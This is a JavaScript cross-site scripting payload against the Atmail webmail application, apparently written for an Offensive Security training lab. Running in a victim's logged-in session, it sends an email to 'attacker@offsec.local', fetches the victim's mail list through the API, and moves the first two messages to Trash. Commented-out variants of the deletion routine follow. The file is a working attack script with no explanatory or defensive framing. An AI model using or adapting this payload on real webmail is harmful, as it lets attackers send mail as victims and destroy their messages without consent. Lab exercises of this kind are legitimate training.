var email = "attacker@offsec.local"; 
var subject = "hacked!";
var message = "This is a test email!";

function send_email()
{
	var uri ="/index.php/mail/composemessage/send/tabId/viewmessageTab1"; 
	var query_string = "?emailTo=" + email + "&emailSubject=" + subject + "&emailBodyHtml= + message";

	xhr = new XMLHttpRequest(); 
	xhr.open("GET", uri + query_string, true); 
	xhr.send(null);
} 
send_email();


function wax_email()
{

	var url  = "http://atmail/index.php/api/mail/list";
	var xhr  = new XMLHttpRequest()
	xhr.open('GET', url, true)
	xhr.onload = function () {
		var mails = JSON.parse(xhr.responseText);
		if (xhr.readyState == 4 && xhr.status == "200") {
			console.table(mails);
		} else {
			console.error(mails);
		}
	
		console.log(mails[0].UID);
		var kill = mails[0].UID + "," + mails[1].UID
		console.log(kill)

		var uri = "http://atmail/index.php/mail/mail/movetofolder/fromFolder/INBOX/toFolder/INBOX.Trash";
		var xhr2 = new XMLHttpRequest()
		var query_string = "?resultContext=messageList&mailId%5B%5D=" + kill;
		xhr2.open("GET", uri + query_string, true);
 		xhr2.send(null)	
		}

	xhr.send(null)


}
wax_email();

//xhr.send(null)

//var uri = "http://atmail/index.php/mail/mail/movetofolder/fromFolder/INBOX/toFolder/INBOX.Trash";
//var xhr = new XMLHttpRequest()
//var query_string = "?resultContext=messageList&mailId%5B%5D=" + kill; 
//xhr.open("GET", uri + query_string, true); 
//xhr.send(null)


//wax_email();
///////////////////
//function wipe_email()
//{
//	var xhr = new XMLHttpRequest();
//	xhr.open("POST", '/index.php/mail/mail/movetofolder/fromFolder/INBOX/toFolder/INBOX.Trash', true);
//	//Send the proper header information along with the request
//	xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
//	xhr.onreadystatechange = function() { // Call a function when the state changes.
//    		if (this.readyState === XMLHttpRequest.DONE && this.status === 200) {
//        // Request finished. Do processing here.
//    		}
//	xhr.send("resultContext=messageList&listFolder=INBOX&pageNumber=1&mailId%5B%5D=42&unseen%5B37%5D=0");
//	}
// xhr.send(new Int8Array());
// 
